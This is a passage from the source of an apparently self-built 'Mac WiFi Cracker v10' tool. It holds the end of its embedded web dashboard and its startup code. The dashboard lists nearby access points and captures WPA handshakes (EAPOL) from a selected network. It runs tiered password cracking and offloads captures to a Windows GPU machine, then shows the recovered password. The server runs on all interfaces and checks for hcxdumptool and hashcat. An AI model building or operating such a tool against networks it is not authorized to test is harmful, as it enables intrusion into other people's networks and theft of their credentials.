  api(`/api/capture?bssid=${selectedBssid}&ssid=${encodeURIComponent(selectedSsid)}&duration=${dur}`, {method: 'POST'});
}

function autoCrack() { api('/api/auto_crack', {method: 'POST'}); }
function sendWin() { api('/api/upload', {method: 'POST'}); }
function crackTier(i) { api(`/api/crack_tier?tier=${i}`, {method: 'POST'}); }

function renderTiers(d) {
  const el = document.getElementById('tier-list');
  let html = '';
  for (const t of d.tiers || []) {
    const cls = t.status === 'running' ? 'running' : (t.completed ? 'done' : '');
    const statusCls = 'tier-' + t.status;
    const progText = t.status === 'running' ? t.progress + '%' : (t.completed ? '✓ Done' : '--');
    const speedText = t.speed ? t.speed : '';
    html += `<div class="tier-card ${cls}">
      <div class="tier-name">T${t.idx+1} ${t.label}</div>
      <div class="tier-status ${statusCls}">${t.status}</div>
      <div class="tier-prog">${progText}</div>
      <div class="tier-speed">${speedText}</div>
    </div>`;
  }
  el.innerHTML = html;
}

function update(d) {
  lastState = d;
  document.getElementById('status').textContent = d.status;
  document.getElementById('progress').style.width = d.progress + '%';
  document.getElementById('message').textContent = d.message;
  
  // Interface badge
  if (d.interface) {
    document.getElementById('iface-badge').textContent = d.interface + ' (' + (d.interface_type||'') + ')';
  }
  
  // EAPOL
  const ed = document.getElementById('eapol-display');
  if (d.capture_eapol_count !== undefined && d.capture_eapol_count !== null) {
    ed.innerHTML = d.capture_eapol_count > 0
      ? `<span class="eapol-badge eapol-ok">✓ ${d.capture_eapol_count} EAPOL</span>`
      : `<span class="eapol-badge eapol-none">✗ No EAPOL</span>`;
  }
  
  // Result
  if (d.crack_result) {
    document.getElementById('result-card').style.display = 'block';
    document.getElementById('result-pw').textContent = d.crack_result;
    document.getElementById('result-source').textContent = d.crack_source || 'Unknown';
  }
  
  // Tiers
  renderTiers(d);
  
  // Windows
  document.getElementById('win-status').textContent = d.win_status || '--';
  document.getElementById('win-temp').textContent = d.win_gpu_temp ? d.win_gpu_temp + '°C' : '--';
  document.getElementById('win-util').textContent = d.win_gpu_util ? d.win_gpu_util + '%' : '--';
  document.getElementById('win-speed').textContent = d.win_speed ? d.win_speed.substring(0,25) : '--';
  
  // Log
  const logEl = document.getElementById('log');
  logEl.textContent = (d.log||[]).slice(-60).join('\\n');
  logEl.scrollTop = logEl.scrollHeight;
  
  // AP table
  const tbody = document.querySelector('#ap-table tbody');
  tbody.innerHTML = '';
  for (const ap of d.ap_list || []) {
    const tr = document.createElement('tr');
    tr.style.cursor = 'pointer';
    tr.onclick = (ev) => selectAp(ap.ssid, ap.bssid, ev);
    const badge = ap.connected ? '<span class="badge badge-connected">CONN</span>' : '';
    tr.innerHTML = `<td>${ap.ssid}</td><td>${ap.bssid}</td><td>${ap.channel||'--'}</td><td>${badge}</td>`;
    tbody.appendChild(tr);
  }
  
  // Buttons
  const busy = ['scanning','capturing','extracting','cracking_local','uploading'].includes(d.status);
  document.getElementById('btn-scan').disabled = (d.status === 'scanning');
  document.getElementById('btn-capture').disabled = busy || (d.ap_list||[]).length === 0;
  document.getElementById('btn-auto').disabled = d.cracking || d.status === 'capturing' || !d.capture_file;
  document.getElementById('btn-win').disabled = d.status === 'uploading' || d.status === 'capturing' || !d.capture_file;
}

// Socket.IO connection
const socket = io();
socket.on('state_update', update);
// Fallback: poll if Socket.IO fails
setInterval(() => {
  if (!socket.connected) {
    api('/api/state').then(update);
  }
}, 3000);
api('/api/state').then(update);
</script>
</body></html>"""

# ─── Main ────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    log("Mac WiFi Cracker v10 starting on port 8765...")
    log(f"Tools: hcxdumptool={os.path.exists(HCXDUMPTOOL)}, hashcat={os.path.exists(HASHCAT)}, "
        f"hcxpcapngtool={os.path.exists(HCXPCAPNGTOOL)}, tcpdump={os.path.exists(TCPDUMP)}")
    
    # Detect WiFi interface
    detect_wifi_interface()
    
    # Windows poller (every 8s)
    def win_poller():
        while True:
            time.sleep(8)
            poll_windows()
    t = threading.Thread(target=win_poller, daemon=True)
    t.start()
    
    log(f"Interface: {STATE['interface']} ({STATE['interface_type']})")
    uvicorn.run(sio_app, host="0.0.0.0", port=8765)
